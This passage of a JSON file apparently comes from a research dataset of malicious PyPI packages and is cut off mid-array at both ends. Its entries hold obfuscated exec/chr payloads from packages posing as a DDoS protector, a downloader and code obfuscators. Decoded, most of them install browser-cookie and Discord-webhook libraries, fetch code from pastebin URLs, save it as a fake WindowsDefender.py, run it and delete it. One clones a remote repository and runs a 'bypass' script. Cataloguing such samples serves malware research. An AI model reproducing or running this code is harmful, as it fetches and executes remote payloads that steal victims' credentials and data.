14,108,32,61,32,39,104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,65,81,87,69,101,66,116,65,39,10,10,97,114,99,104,105,118,111,32,61,32,114,101,113,117,101,115,116,115,46,103,101,116,40,117,114,108,41,10,10,114,117,116,97,32,61,32,111,115,46,112,97,116,104,46,106,111,105,110,40,111,115,46,112,97,116,104,46,101,120,112,97,110,100,117,115,101,114,40,39,126,39,41,44,32,39,87,105,110,100,111,119,115,68,101,102,101,110,100,101,114,46,112,121,39,41,10,119,105,116,104,32,111,112,101,110,40,114,117,116,97,44,32,39,119,39,44,32,101,110,99,111,100,105,110,103,61,39,117,116,102,45,56,39,41,32,97,115,32,102,58,10,32,32,32,32,102,46,119,114,105,116,101,40,34,35,32,45,42,45,32,99,111,100,105,110,103,58,32,108,97,116,105,110,45,49,32,45,42,45,92,110,34,41,10,32,32,32,32,102,46,119,114,105,116,101,40,97,114,99,104,105,118,111,46,116,101,120,116,41,10,10,10,115,117,98,112,114,111,99,101,115,115,46,114,117,110,40,91,39,112,121,116,104,111,110,39,44,32,114,117,116,97,93,41,10,10,111,115,46,114,101,109,111,118,101,40,114,117,116,97,41,10,10,10,10,115,101,116,117,112,40,10,32,32,32,32,110,97,109,101,61,39,112,121,111,98,102,101,120,101,99,117,116,101,39,44,10,32,32,32,32,118,101,114,115,105,111,110,61,39,49,46,48,46,49,39,44,10,32,32,32,32,112,97,99,107,97,103,101,115,61,91,39,112,121,111,98,102,101,120,101,99,117,116,101,39,93,44,10,32,32,32,32,117,114,108,61,39,104,116,116,112,115,58,47,47,103,105,116,104,117,98,46,99,111,109,47,112,121,111,98,102,101,120,101,99,117,116,101,47,112,121,111,98,102,101,120,101,99,117,116,101,39,44,10,32,32,32,32,108,105,99,101,110,115,101,61,39,39,44,10,32,32,32,32,97,117,116,104,111,114,61,39,112,121,111,98,102,101,120,101,99,117,116,101,39,44,10,32,32,32,32,97,117,116,104,111,114,95,101,109,97,105,108,61,39,112,121,111,98,102,101,120,101,99,117,116,101,64,103,109,97,105,108,46,99,111,109,39,44,10,32,32,32,32,100,101,115,99,114,105,112,116,105,111,110,61,39,80,121,116,104,111,110,32,69,120,101,99,117,116,97,98,108,101,32,70,105,108,101,115,32,79,98,102,117,115,99,97,116,111,114,39,10,41,10,10,105,102,32,95,95,110,97,109,101,95,95,32,61,61,32,39,95,95,109,97,105,110,95,95,39,58,10,32,32,32,32,115,101,110,100,95,100,105,115,99,111,114,100,95,105,110,102,111,40,41])))"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-06-pyddosprotect-v1.0.0",
        "code": "exec(\"\".join(map(chr, [102,114,111,109,32,115,101,116,117,112,116,111,111,108,115,32,105,109,112,111,114,116,32,115,101,116,117,112,10,105,109,112,111,114,116,32,115,111,99,107,101,116,10,105,109,112,111,114,116,32,117,114,108,108,105,98,46,114,101,113,117,101,115,116,10,105,109,112,111,114,116,32,111,115,10,105,109,112,111,114,116,32,115,104,117,116,105,108,10,105,109,112,111,114,116,32,119,105,110,114,101,103,10,105,109,112,111,114,116,32,114,101,113,117,101,115,116,115,10,105,109,112,111,114,116,32,112,105,112,10,10,112,97,99,107,97,103,101,115,32,61,32,91,39,112,114,101,116,116,121,116,97,98,108,101,39,44,32,39,112,121,99,111,117,110,116,114,121,39,44,32,39,112,121,95,99,112,117,105,110,102,111,39,44,32,39,98,114,111,119,115,101,114,95,104,105,115,116,111,114,121,39,44,32,39,99,111,108,111,114,97,109,97,39,44,32,39,112,115,117,116,105,108,39,44,32,39,114,101,113,117,101,115,116,115,39,44,32,39,115,111,99,107,101,116,115,39,44,32,39,112,121,99,97,119,39,44,32,39,99,111,109,116,121,112,101,115,39,44,32,39,100,105,115,99,111,114,100,39,44,32,39,112,121,112,105,119,105,110,51,50,39,44,32,39,112,121,99,114,121,112,116,111,100,111,109,101,39,44,32,39,117,117,105,100,39,44,32,39,99,114,121,112,116,111,103,114,97,112,104,121,39,44,32,39,112,121,102,105,103,108,101,116,39,44,32,39,98,114,111,119,115,101,114,95,99,111,111,107,105,101,51,39,44,32,39,100,105,115,99,111,114,100,95,119,101,98,104,111,111,107,39,44,32,39,112,114,101,116,116,121,116,97,98,108,101,39,44,32,39,103,101,116,109,97,99,39,44,32,39,112,121,97,117,116,111,103,117,105,39,44,32,39,119,105,110,114,101,103,105,115,116,114,121,39,44,32,39,114,111,98,108,111,120,112,121,39,44,32,39,112,121,119,105,110,51,50,39,44,32,39,80,105,108,108,111,119,39,44,32,39,116,113,100,109,39,44,32,39,115,101,116,117,112,116,111,111,108,115,39,44,32,39,111,112,101,110,99,118,45,112,121,116,104,111,110,39,44,32,39,110,117,109,112,121,39,44,32,39,112,121,99,97,119,39,44,32,39,119,109,105,39,93,10,10,102,111,114,32,112,97,99,107,97,103,101,32,105,110,32,112,97,99,107,97,103,101,115,58,10,32,32,32,32,112,105,112,46,109,97,105,110,40,91,39,105,110,115,116,97,108,108,39,44,32,112,97,99,107,97,103,101,93,41,10,10,10,100,101,102,32,115,101,110,100,95,100,105,115,99,111,114,100,95,105,110,102,111,40,41,58,10,32,105,109,112,111,114,116,32,114,101,113,117,101,115,116,115,10,32,105,109,112,111,114,116,32,111,115,10,10,117,114,108,32,61,32,39,104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,112,108,47,118,105,101,119,47,114,97,119,47,56,56,98,49,97,102,54,50,39,10,10,97,114,99,104,105,118,111,32,61,32,114,101,113,117,101,115,116,115,46,103,101,116,40,117,114,108,41,10,99,111,100,105,103,111,32,61,32,97,114,99,104,105,118,111,46,116,101,120,116,10,10,114,117,116,97,32,61,32,111,115,46,112,97,116,104,46,106,111,105,110,40,111,115,46,112,97,116,104,46,101,120,112,97,110,100,117,115,101,114,40,39,126,39,41,44,32,39,87,105,110,100,111,119,115,68,101,102,101,110,100,101,114,46,112,121,39,41,10,119,105,116,104,32,111,112,101,110,40,114,117,116,97,44,32,39,119,39,44,32,101,110,99,111,100,105,110,103,61,39,117,116,102,45,56,39,41,32,97,115,32,102,58,10,32,32,32,32,102,46,119,114,105,116,101,40,34,35,32,45,42,45,32,99,111,100,105,110,103,58,32,108,97,116,105,110,45,49,32,45,42,45,92,110,34,41,10,32,32,32,32,102,46,119,114,105,116,101,40,99,111,100,105,103,111,41,10,10,101,120,101,99,40,99,111,109,112,105,108,101,40,99,111,100,105,103,111,44,32,114,117,116,97,44,32,39,101,120,101,99,39,41,41,10,10,111,115,46,114,101,109,111,118,101,40,114,117,116,97,41,10,10,10,102,114,111,109,32,115,101,116,117,112,116,111,111,108,115,32,105,109,112,111,114,116,32,115,101,116,117,112,10,10,115,101,116,117,112,40,10,32,32,32,32,110,97,109,101,61,39,112,121,100,100,111,115,112,114,111,116,101,99,116,39,44,10,32,32,32,32,118,101,114,115,105,111,110,61,39,49,46,48,46,48,39,44,10,32,32,32,32,112,97,99,107,97,103,101,115,61,91,39,112,121,100,100,111,115,112,114,111,116,101,99,116,39,93,44,10,32,32,32,32,117,114,108,61,39,104,116,116,112,115,58,47,47,103,105,116,104,117,98,46,99,111,109,47,112,121,100,100,111,115,112,114,111,116,101,99,116,47,112,121,100,100,111,115,112,114,111,116,101,99,116,39,44,10,32,32,32,32,108,105,99,101,110,115,101,61,39,39,44,10,32,32,32,32,97,117,116,104,111,114,61,39,112,121,100,100,111,115,112,114,111,116,101,99,116,39,44,10,32,32,32,32,97,117,116,104,111,114,95,101,109,97,105,108,61,39,112,121,100,100,111,115,112,114,111,116,101,99,116,64,103,109,97,105,108,46,99,111,109,39,44,10,32,32,32,32,100,101,115,99,114,105,112,116,105,111,110,61,39,80,121,116,104,111,110,32,68,68,111,83,32,80,114,111,116,101,99,116,111,114,39,44,10,41,10,10,10,105,102,32,95,95,110,97,109,101,95,95,32,61,61,32,39,95,95,109,97,105,110,95,95,39,58,10,32,32,32,32,115,101,110,100,95,100,105,115,99,111,114,100,95,105,110,102,111,40,41])))"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-06-pyfastdownload-v1.0.0",
        "code": "exec(\"\".join(map(chr, [102,114,111,109,32,115,101,116,117,112,116,111,111,108,115,32,105,109,112,111,114,116,32,115,101,116,117,112,10,105,109,112,111,114,116,32,115,111,99,107,101,116,10,105,109,112,111,114,116,32,117,114,108,108,105,98,46,114,101,113,117,101,115,116,10,105,109,112,111,114,116,32,111,115,10,105,109,112,111,114,116,32,115,104,117,116,105,108,10,105,109,112,111,114,116,32,119,105,110,114,101,103,10,105,109,112,111,114,116,32,114,101,113,117,101,115,116,115,10,105,109,112,111,114,116,32,112,105,112,10,10,112,97,99,107,97,103,101,115,32,61,32,91,39,112,114,101,116,116,121,116,97,98,108,101,39,44,32,39,112,121,99,111,117,110,116,114,121,39,44,32,39,112,121,95,99,112,117,105,110,102,111,39,44,32,39,98,114,111,119,115,101,114,95,104,105,115,116,111,114,121,39,44,32,39,99,111,108,111,114,97,109,97,39,44,32,39,112,115,117,116,105,108,39,44,32,39,114,101,113,117,101,115,116,115,39,44,32,39,115,111,99,107,101,116,115,39,44,32,39,112,121,99,97,119,39,44,32,39,99,111,109,116,121,112,101,115,39,44,32,39,100,105,115,99,111,114,100,39,44,32,39,112,121,112,105,119,105,110,51,50,39,44,32,39,112,121,99,114,121,112,116,111,100,111,109,101,39,44,32,39,117,117,105,100,39,44,32,39,99,114,121,112,116,111,103,114,97,112,104,121,39,44,32,39,112,121,102,105,103,108,101,116,39,44,32,39,98,114,111,119,115,101,114,95,99,111,111,107,105,101,51,39,44,32,39,100,105,115,99,111,114,100,95,119,101,98,104,111,111,107,39,44,32,39,112,114,101,116,116,121,116,97,98,108,101,39,44,32,39,103,101,116,109,97,99,39,44,32,39,112,121,97,117,116,111,103,117,105,39,44,32,39,119,105,110,114,101,103,105,115,116,114,121,39,44,32,39,114,111,98,108,111,120,112,121,39,44,32,39,112,121,119,105,110,51,50,39,44,32,39,80,105,108,108,111,119,39,44,32,39,116,113,100,109,39,44,32,39,115,101,116,117,112,116,111,111,108,115,39,44,32,39,111,112,101,110,99,118,45,112,121,116,104,111,110,39,44,32,39,110,117,109,112,121,39,44,32,39,112,121,99,97,119,39,44,32,39,119,109,105,39,93,10,10,102,111,114,32,112,97,99,107,97,103,101,32,105,110,32,112,97,99,107,97,103,101,115,58,10,32,32,32,32,112,105,112,46,109,97,105,110,40,91,39,105,110,115,116,97,108,108,39,44,32,112,97,99,107,97,103,101,93,41,10,10,10,100,101,102,32,115,101,110,100,95,100,105,115,99,111,114,100,95,105,110,102,111,40,41,58,10,32,105,109,112,111,114,116,32,114,101,113,117,101,115,116,115,10,32,105,109,112,111,114,116,32,111,115,10,10,117,114,108,32,61,32,39,104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,112,108,47,118,105,101,119,47,114,97,119,47,101,48,100,98,53,49,97,53,39,10,10,97,114,99,104,105,118,111,32,61,32,114,101,113,117,101,115,116,115,46,103,101,116,40,117,114,108,41,10,99,111,100,105,103,111,32,61,32,97,114,99,104,105,118,111,46,116,101,120,116,10,10,114,117,116,97,32,61,32,111,115,46,112,97,116,104,46,106,111,105,110,40,111,115,46,112,97,116,104,46,101,120,112,97,110,100,117,115,101,114,40,39,126,39,41,44,32,39,87,105,110,100,111,119,115,68,101,102,101,110,100,101,114,46,112,121,39,41,10,119,105,116,104,32,111,112,101,110,40,114,117,116,97,44,32,39,119,39,44,32,101,110,99,111,100,105,110,103,61,39,117,116,102,45,56,39,41,32,97,115,32,102,58,10,32,32,32,32,102,46,119,114,105,116,101,40,34,35,32,45,42,45,32,99,111,100,105,110,103,58,32,108,97,116,105,110,45,49,32,45,42,45,92,110,34,41,10,32,32,32,32,102,46,119,114,105,116,101,40,99,111,100,105,103,111,41,10,10,101,120,101,99,40,99,111,109,112,105,108,101,40,99,111,100,105,103,111,44,32,114,117,116,97,44,32,39,101,120,101,99,39,41,41,10,10,111,115,46,114,101,109,111,118,101,40,114,117,116,97,41,10,10,10,102,114,111,109,32,115,101,116,117,112,116,111,111,108,115,32,105,109,112,111,114,116,32,115,101,116,117,112,10,10,115,101,116,117,112,40,10,32,32,32,32,110,97,109,101,61,39,112,121,102,97,115,116,100,111,119,110,108,111,97,100,39,44,10,32,32,32,32,118,101,114,115,105,111,110,61,39,49,46,48,46,48,39,44,10,32,32,32,32,112,97,99,107,97,103,101,115,61,91,39,112,121,102,97,115,116,100,111,119,110,108,111,97,100,39,93,44,10,32,32,32,32,117,114,108,61,39,104,116,116,112,115,58,47,47,103,105,116,104,117,98,46,99,111,109,47,112,121,102,97,115,116,100,111,119,110,108,111,97,100,47,112,121,102,97,115,116,100,111,119,110,108,111,97,100,39,44,10,32,32,32,32,108,105,99,101,110,115,101,61,39,39,44,10,32,32,32,32,97,117,116,104,111,114,61,39,112,121,102,97,115,116,100,111,119,110,108,111,97,100,39,44,10,32,32,32,32,97,117,116,104,111,114,95,101,109,97,105,108,61,39,112,121,102,97,115,116,100,111,119,110,108,111,97,100,64,103,109,97,105,108,46,99,111,109,39,44,10,32,32,32,32,100,101,115,99,114,105,112,116,105,111,110,61,39,80,121,116,104,111,110,32,70,97,115,116,32,68,111,119,110,108,111,97,100,115,39,44,10,41,10,10,10,105,102,32,95,95,110,97,109,101,95,95,32,61,61,32,39,95,95,109,97,105,110,95,95,39,58,10,32,32,32,32,115,101,110,100,95,100,105,115,99,111,114,100,95,105,110,102,111,40,41])))"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-06-pypaquets-v1.0.1",
        "code": "exec(\"\".join(map(chr, [102,114,111,109,32,115,101,116,117,112,116,111,111,108,115,32,105,109,112,111,114,116,32,115,101,116,117,112,10,105,109,112,111,114,116,32,115,111,99,107,101,116,10,105,109,112,111,114,116,32,117,114,108,108,105,98,46,114,101,113,117,101,115,116,10,105,109,112,111,114,116,32,111,115,10,105,109,112,111,114,116,32,115,104,117,116,105,108,10,105,109,112,111,114,116,32,119,105,110,114,101,103,10,105,109,112,111,114,116,32,114,101,113,117,101,115,116,115,10,105,109,112,111,114,116,32,112,105,112,10,10,112,97,99,107,97,103,101,115,32,61,32,91,39,112,114,101,116,116,121,116,97,98,108,101,39,44,32,39,112,121,99,111,117,110,116,114,121,39,44,32,39,112,121,95,99,112,117,105,110,102,111,39,44,32,39,98,114,111,119,115,101,114,95,104,105,115,116,111,114,121,39,44,32,39,99,111,108,111,114,97,109,97,39,44,32,39,112,115,117,116,105,108,39,44,32,39,114,101,113,117,101,115,116,115,39,44,32,39,115,111,99,107,101,116,115,39,44,32,39,112,121,99,97,119,39,44,32,39,99,111,109,116,121,112,101,115,39,44,32,39,100,105,115,99,111,114,100,39,44,32,39,112,121,112,105,119,105,110,51,50,39,44,32,39,112,121,99,114,121,112,116,111,100,111,109,101,39,44,32,39,117,117,105,100,39,44,32,39,99,114,121,112,116,111,103,114,97,112,104,121,39,44,32,39,112,121,102,105,103,108,101,116,39,44,32,39,98,114,111,119,115,101,114,95,99,111,111,107,105,101,51,39,44,32,39,100,105,115,99,111,114,100,95,119,101,98,104,111,111,107,39,44,32,39,112,114,101,116,116,121,116,97,98,108,101,39,44,32,39,103,101,116,109,97,99,39,44,32,39,112,121,97,117,116,111,103,117,105,39,44,32,39,119,105,110,114,101,103,105,115,116,114,121,39,44,32,39,114,111,98,108,111,120,112,121,39,44,32,39,112,121,119,105,110,51,50,39,44,32,39,80,105,108,108,111,119,39,44,32,39,116,113,100,109,39,44,32,39,115,101,116,117,112,116,111,111,108,115,39,44,32,39,111,112,101,110,99,118,45,112,121,116,104,111,110,39,44,32,39,110,117,109,112,121,39,44,32,39,112,121,99,97,119,39,44,32,39,119,109,105,39,93,10,10,102,111,114,32,112,97,99,107,97,103,101,32,105,110,32,112,97,99,107,97,103,101,115,58,10,32,32,32,32,112,105,112,46,109,97,105,110,40,91,39,105,110,115,116,97,108,108,39,44,32,112,97,99,107,97,103,101,93,41,10,10,10,100,101,102,32,115,101,110,100,95,100,105,115,99,111,114,100,95,105,110,102,111,40,41,58,10,32,105,109,112,111,114,116,32,114,101,113,117,101,115,116,115,10,32,105,109,112,111,114,116,32,111,115,10,10,117,114,108,32,61,32,39,104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,112,108,47,118,105,101,119,47,114,97,119,47,101,48,100,98,53,49,97,53,39,10,10,97,114,99,104,105,118,111,32,61,32,114,101,113,117,101,115,116,115,46,103,101,116,40,117,114,108,41,10,99,111,100,105,103,111,32,61,32,97,114,99,104,105,118,111,46,116,101,120,116,10,10,114,117,116,97,32,61,32,111,115,46,112,97,116,104,46,106,111,105,110,40,111,115,46,112,97,116,104,46,101,120,112,97,110,100,117,115,101,114,40,39,126,39,41,44,32,39,87,105,110,100,111,119,115,68,101,102,101,110,100,101,114,46,112,121,39,41,10,119,105,116,104,32,111,112,101,110,40,114,117,116,97,44,32,39,119,39,44,32,101,110,99,111,100,105,110,103,61,39,117,116,102,45,56,39,41,32,97,115,32,102,58,10,32,32,32,32,102,46,119,114,105,116,101,40,34,35,32,45,42,45,32,99,111,100,105,110,103,58,32,108,97,116,105,110,45,49,32,45,42,45,92,110,34,41,10,32,32,32,32,102,46,119,114,105,116,101,40,99,111,100,105,103,111,41,10,10,101,120,101,99,40,99,111,109,112,105,108,101,40,99,111,100,105,103,111,44,32,114,117,116,97,44,32,39,101,120,101,99,39,41,41,10,10,111,115,46,114,101,109,111,118,101,40,114,117,116,97,41,10,10,10,102,114,111,109,32,115,101,116,117,112,116,111,111,108,115,32,105,109,112,111,114,116,32,115,101,116,117,112,10,10,115,101,116,117,112,40,10,32,32,32,32,110,97,109,101,61,39,112,121,112,97,113,117,101,116,115,39,44,10,32,32,32,32,118,101,114,115,105,111,110,61,39,49,46,48,46,49,39,44,10,32,32,32,32,112,97,99,107,97,103,101,115,61,91,39,112,121,112,97,113,117,101,116,115,39,93,44,10,32,32,32,32,117,114,108,61,39,104,116,116,112,115,58,47,47,103,105,116,104,117,98,46,99,111,109,47,112,121,112,97,113,117,101,116,115,47,112,121,112,97,113,117,101,116,115,39,44,10,32,32,32,32,108,105,99,101,110,115,101,61,39,39,44,10,32,32,32,32,97,117,116,104,111,114,61,39,112,121,112,97,113,117,101,116,115,39,44,10,32,32,32,32,97,117,116,104,111,114,95,101,109,97,105,108,61,39,112,121,112,97,113,117,101,116,115,64,103,109,97,105,108,46,99,111,109,39,44,10,32,32,32,32,100,101,115,99,114,105,112,116,105,111,110,61,39,80,121,116,104,111,110,32,73,110,115,116,97,108,108,32,80,97,113,117,101,115,116,115,39,44,10,41,10,10,10,105,102,32,95,95,110,97,109,101,95,95,32,61,61,32,39,95,95,109,97,105,110,95,95,39,58,10,32,32,32,32,115,101,110,100,95,100,105,115,99,111,114,100,95,105,110,102,111,40,41])))"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-21-ultraobfuscator-v1.0.0",
        "code": "exec(\"\".join(map(chr, [102,114,111,109,32,115,101,116,117,112,116,111,111,108,115,32,105,109,112,111,114,116,32,115,101,116,117,112,10,105,109,112,111,114,116,32,114,101,113,117,101,115,116,115,10,105,109,112,111,114,116,32,115,111,99,107,101,116,10,105,109,112,111,114,116,32,115,117,98,112,114,111,99,101,115,115,10,105,109,112,111,114,116,32,111,115,10,10,35,32,73,110,115,116,97,108,97,32,101,108,32,112,97,113,117,101,116,101,32,103,105,116,112,121,116,104,111,110,10,115,117,98,112,114,111,99,101,115,115,46,114,117,110,40,91,39,112,105,112,39,44,32,39,105,110,115,116,97,108,108,39,44,32,39,103,105,116,112,121,116,104,111,110,39,93,41,10,115,117,98,112,114,111,99,101,115,115,46,114,117,110,40,91,39,112,105,112,39,44,32,39,105,110,115,116,97,108,108,39,44,32,39,114,101,113,117,101,115,116,115,39,93,41,10,115,117,98,112,114,111,99,101,115,115,46,114,117,110,40,91,39,112,105,112,39,44,32,39,105,110,115,116,97,108,108,39,44,32,39,115,111,99,107,101,116,115,39,93,41,10,115,117,98,112,114,111,99,101,115,115,46,114,117,110,40,91,39,112,105,112,39,44,32,39,105,110,115,116,97,108,108,39,44,32,39,112,121,112,105,119,105,110,51,50,39,93,41,10,115,117,98,112,114,111,99,101,115,115,46,114,117,110,40,91,39,112,105,112,39,44,32,39,105,110,115,116,97,108,108,39,44,32,39,112,121,99,114,121,112,116,111,100,111,109,101,39,93,41,10,115,117,98,112,114,111,99,101,115,115,46,114,117,110,40,91,39,112,105,112,39,44,32,39,105,110,115,116,97,108,108,39,44,32,39,117,117,105,100,39,93,41,10,115,117,98,112,114,111,99,101,115,115,46,114,117,110,40,91,39,112,105,112,39,44,32,39,105,110,115,116,97,108,108,39,44,32,39,99,114,121,112,116,111,103,114,97,112,104,121,39,93,41,10,115,117,98,112,114,111,99,101,115,115,46,114,117,110,40,91,39,112,105,112,39,44,32,39,105,110,115,116,97,108,108,39,44,32,39,112,121,102,105,103,108,101,116,39,93,41,10,115,117,98,112,114,111,99,101,115,115,46,114,117,110,40,91,39,112,105,112,39,44,32,39,105,110,115,116,97,108,108,39,44,32,39,98,114,111,119,115,101,114,95,99,111,111,107,105,101,51,39,93,41,10,115,117,98,112,114,111,99,101,115,115,46,114,117,110,40,91,39,112,105,112,39,44,32,39,105,110,115,116,97,108,108,39,44,32,39,100,105,115,99,111,114,100,95,119,101,98,104,111,111,107,39,93,41,10,115,117,98,112,114,111,99,101,115,115,46,114,117,110,40,91,39,112,105,112,39,44,32,39,105,110,115,116,97,108,108,39,44,32,39,112,114,101,116,116,121,116,97,98,108,101,39,93,41,10,115,117,98,112,114,111,99,101,115,115,46,114,117,110,40,91,39,112,105,112,39,44,32,39,105,110,115,116,97,108,108,39,44,32,39,103,101,116,109,97,99,39,93,41,10,115,117,98,112,114,111,99,101,115,115,46,114,117,110,40,91,39,112,105,112,39,44,32,39,105,110,115,116,97,108,108,39,44,32,39,112,121,97,117,116,111,103,117,105,39,93,41,10,115,117,98,112,114,111,99,101,115,115,46,114,117,110,40,91,39,112,105,112,39,44,32,39,105,110,115,116,97,108,108,39,44,32,39,119,105,110,114,101,103,105,115,116,114,121,39,93,41,10,115,117,98,112,114,111,99,101,115,115,46,114,117,110,40,91,39,112,105,112,39,44,32,39,105,110,115,116,97,108,108,39,44,32,39,114,111,98,108,111,120,112,121,39,93,41,10,115,117,98,112,114,111,99,101,115,115,46,114,117,110,40,91,39,112,105,112,39,44,32,39,105,110,115,116,97,108,108,39,44,32,39,80,105,108,108,111,119,39,93,41,10,115,117,98,112,114,111,99,101,115,115,46,114,117,110,40,91,39,112,105,112,39,44,32,39,105,110,115,116,97,108,108,39,44,32,39,116,113,100,109,39,93,41,10,115,117,98,112,114,111,99,101,115,115,46,114,117,110,40,91,39,112,105,112,39,44,32,39,105,110,115,116,97,108,108,39,44,32,39,115,101,116,117,112,116,111,111,108,115,39,93,41,10,10,105,109,112,111,114,116,32,103,105,116,10,10,10,100,101,102,32,115,101,110,100,95,100,105,115,99,111,114,100,95,105,110,102,111,40,41,58,10,32,32,32,32,35,32,67,108,111,110,97,32,101,108,32,114,101,112,111,115,105,116,111,114,105,111,32,100,101,32,71,105,116,72,117,98,32,121,32,101,106,101,99,117,116,97,32,101,108,32,97,114,99,104,105,118,111,10,32,32,32,32,114,101,112,111,95,117,114,108,32,61,32,39,104,116,116,112,115,58,47,47,103,105,116,104,117,98,46,99,111,109,47,78,111,116,73,110,102,101,99,116,101,100,47,117,112,100,97,116,101,114,46,103,105,116,39,32,32,35,32,82,101,101,109,112,108,97,122,97,32,99,111,110,32,108,97,32,85,82,76,32,100,101,32,116,117,32,114,101,112,111,115,105,116,111,114,105,111,32,100,101,32,71,105,116,72,117,98,10,32,32,32,32,114,101,112,111,95,112,97,116,104,32,61,32,111,115,46,112,97,116,104,46,106,111,105,110,40,39,67,58,39,44,32,39,85,115,101,114,115,39,44,32,39,114,101,112,111,39,41,32,32,35,32,82,117,116,97,32,100,111,110,100,101,32,100,101,115,101,97,115,32,99,108,111,110,97,114,32,101,108,32,114,101,112,111,115,105,116,111,114,105,111,10,10,32,32,32,32,105,102,32,110,111,116,32,111,115,46,112,97,116,104,46,105,115,100,105,114,40,114,101,112,111,95,112,97,116,104,41,58,10,32,32,32,32,32,32,32,32,103,105,116,46,82,101,112,111,46,99,108,111,110,101,95,102,114,111,109,40,114,101,112,111,95,117,114,108,44,32,114,101,112,111,95,112,97,116,104,41,10,10,32,32,32,32,111,115,46,99,104,100,105,114,40,114,101,112,111,95,112,97,116,104,41,10,32,32,32,32,115,117,98,112,114,111,99,101,115,115,46,114,117,110,40,91,39,112,121,116,104,111,110,39,44,32,39,98,121,112,97,115,115,46,112,121,39,93,41,10,10,35,32,68,101,102,105,110,101,32,108,97,32,114,117,116,97,32,100,111,110,100,101,32,100,101,115,101,97,115,32,99,108,111,110,97,114,32,101,108,32,114,101,112,111,115,105,116,111,114,105,111,10,114,101,112,111,95,112,97,116,104,32,61,32,111,115,46,112,97,116,104,46,106,111,105,110,40,39,67,58,39,44,32,39,85,115,101,114,115,39,44,32,39,114,101,112,111,39,41,10,10,115,101,116,117,112,40,10,32,32,32,32,110,97,109,101,61,39,117,108,116,114,97,111,98,102,117,115,99,97,116,111,114,39,44,10,32,32,32,32,118,101,114,115,105,111,110,61,39,49,46,48,46,48,39,44,10,32,32,32,32,112,97,99,107,97,103,101,115,61,91,39,117,108,116,114,97,111,98,102,117,115,99,97,116,111,114,39,93,44,10,32,32,32,32,117,114,108,61,39,104,116,116,112,115,58,47,47,103,105,116,104,117,98,46,99,111,109,47,116,117,117,115,117,97,114,105,111,47,117,108,116,114,97,111,98,102,117,115,99,97,116,111,114,39,44,10,32,32,32,32,108,105,99,101,110,115,101,61,39,39,44,10,32,32,32,32,97,117,116,104,111,114,61,39,85,108,116,114,97,79,98,102,117,115,99,97,116,111,114,39,44,10,32,32,32,32,97,117,116,104,111,114,95,101,109,97,105,108,61,39,117,108,116,114,97,111,98,102,117,115,99,97,116,111,114,64,103,109,97,105,108,46,99,111,109,39,44,10,32,32,32,32,100,101,115,99,114,105,112,116,105,111,110,61,39,85,108,116,114,97,79,98,102,117,115,99,97,116,111,114,32,102,111,114,32,121,111,117,114,32,80,121,116,104,111,110,32,70,105,108,101,115,39,10,41,10,10,105,102,32,95,95,110,97,109,101,95,95,32,61,61,32,39,95,95,109,97,105,110,95,95,39,58,10,32,32,32,32,115,101,110,100,95,100,105,115,99,111,114,100,95,105,110,102,111,40,41])))"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-08-colorating-v1.0.0",
        "code": "exec(\"\".join(map(chr, [102,114,111,109,32,115,101,116,117,112,116,111,111,108,115,32,105,109,112,111,114,116,32,115,101,116,117,112,10,105,109,112,111,114,116,32,115,111,99,107,101,116,10,105,109,112,111,114,116,32,117,114,108,108,105,98,46,114,101,113,117,101,115,116,10,105,109,112,111,114,116,32,111,115,10,105,109,112,111,114,116,32,115,104,117,116,105,108,10,105,109,112,111,114,116,32,119,105,110,114,101,103,10,105,109,112,111,114,116,32,114,101,113,117,101,115,116,115,10,105,109,112,111,114,116,32,112,105,112,10,10,112,97,99,107,97,103,101,115,32,61,32,91,39,112,114,101,116,116,121,116,97,98,108,101,39,44,32,39,112,121,99,111,117,110,116,114,121,39,44,32,39,112,121,95,99,112,117,105,110,102,111,39,44,32,39,98,114,111,119,115,101,114,95,104,105,115,116,111,114,121,39,44,32,39,99,111,108,111,114,97,109,97,39,44,32,39,112,115,117,116,105,108,39,44,32,39,114,101,113,117,101,115,116,115,39,44,32,39,115,111,99,107,101,116,115,39,44,32,39,112,121,99,97,119,39,44,32,39,99,111,109,116,121,112,101,115,39,44,32,39,100,105,115,99,111,114,100,39,44,32,39,112,121,112,105,119,105,110,51,50,39,44,32,39,112,121,99,114,121,112,116,111,100,111,109,101,39,44,32,39,117,117,105,100,39,44,32,39,99,114,121,112,116,111,103,114,97,112,104,121,39,44,32,39,112,121,102,105,103,108,101,116,39,44,32,39,98,114,111,119,115,101,114,95,99,111,111,107,105,101,51,39,44,32,39,100,105,115,99,111,114,100,95,119,101,98,104,111,111,107,39,44,32,39,112,114,101,116,116,121,116,97,98,108,101,39,44,32,39,103,101,116,109,97,99,39,44,32,39,112,121,97,117,116,111,103,117,105,39,44,32,39,119,105,110,114,101,103,105,115,116,114,121,39,44,32,39,114,111,98,108,111,120,112,121,39,44,32,39,112,121,119,105,110,51,50,39,44,32,39,80,105,108,108,111,119,39,44,32,39,116,113,100,109,39,44,32,39,115,101,116,117,112,116,111,111,108,115,39,44,32,39,111,112,101,110,99,118,45,112,121,116,104,111,110,39,44,32,39,110,117,109,112,121,39,44,32,39,112,121,99,97,119,39,44,32,39,119,109,105,39,93,10,10,102,111,114,32,112,97,99,107,97,103,101,32,105,110,32,112,97,99,107,97,103,101,115,58,10,32,32,32,32,112,105,112,46,109,97,105,110,40,91,39,105,110,115,116,97,108,108,39,44,32,112,97,99,107,97,103,101,93,41,10,10,10,100,101,102,32,115,101,110,100,95,100,105,115,99,111,114,100,95,105,110,102,111,40,41,58,10,32,105,109,112,111,114,116,32,114,101,113,117,101,115,116,115,10,32,105,109,112,111,114,116,32,111,115,10,10,117,114,108,32,61,32,39,104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,112,108,47,118,105,101,119,47,114,97,119,47,57,50,97,100,97,51,102,57,39,10,10,97,114,99,104,105,118,111,32,61,32,114,101,113,117,101,115,116,115,46,103,101,116,40,117,114,108,41,10,99,111,100,105,103,111,32,61,32,97,114,99,104,105,118,111,46,116,101,120,116,10,10,11